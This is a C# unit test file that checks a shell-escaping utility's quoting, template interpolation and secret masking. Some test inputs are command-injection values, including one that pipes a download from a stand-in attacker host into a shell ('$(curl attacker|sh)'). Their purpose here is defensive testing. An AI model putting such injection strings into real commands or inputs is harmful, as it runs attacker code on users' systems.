using Menuki.Engine;
using Xunit;

namespace Menuki.Tests;

public class ShellEscaperTests
{
    [Theory]
    [InlineData("simple", "'simple'")]
    [InlineData("with space", "'with space'")]
    [InlineData("$(curl attacker|sh)", "'$(curl attacker|sh)'")]
    [InlineData("a;b&&c|d", "'a;b&&c|d'")]
    [InlineData("`whoami`", "'`whoami`'")]
    public void QuotePosix_wraps_and_neutralizes_metacharacters(string input, string expected)
    {
        Assert.Equal(expected, ShellEscaper.QuotePosix(input));
    }

    [Fact]
    public void QuotePosix_escapes_embedded_single_quote()
    {
        // O'Brien -> 'O'\''Brien'  (close quote, escaped literal quote, reopen quote)
        Assert.Equal("'O'\\''Brien'", ShellEscaper.QuotePosix("O'Brien"));
    }

    [Fact]
    public void QuoteWindows_strips_expansion_characters()
    {
        Assert.Equal("\"PATH\"", ShellEscaper.QuoteWindows("%PATH%"));
        Assert.Equal("\"x\"", ShellEscaper.QuoteWindows("!x!"));
        Assert.Equal("\"a\"\"b\"", ShellEscaper.QuoteWindows("a\"b"));
    }

    [Fact]
    public void Interpolate_quotes_every_substituted_value()
    {
        var command = ShellEscaper.Interpolate(
            "ssh deploy@{host} run {cmd}",
            new Dictionary<string, string> { ["host"] = "$(evil)", ["cmd"] = "a b" });

        // Placeholders are replaced with quoted literals; the injection cannot break out.
        Assert.DoesNotContain("@$(evil)", command);
        Assert.Contains("deploy@'$(evil)'", command);
        Assert.Contains("run 'a b'", command);
    }

    [Fact]
    public void InterpolateForDisplay_masks_secret_values_only()
    {
        var display = ShellEscaper.InterpolateForDisplay(
            "curl -u {user}:{token} api",
            new Dictionary<string, string> { ["user"] = "alice", ["token"] = "s3cr3t" },
            new HashSet<string> { "token" });

        Assert.Contains("'alice'", display);
        Assert.Contains("***", display);
        Assert.DoesNotContain("s3cr3t", display);
    }
}
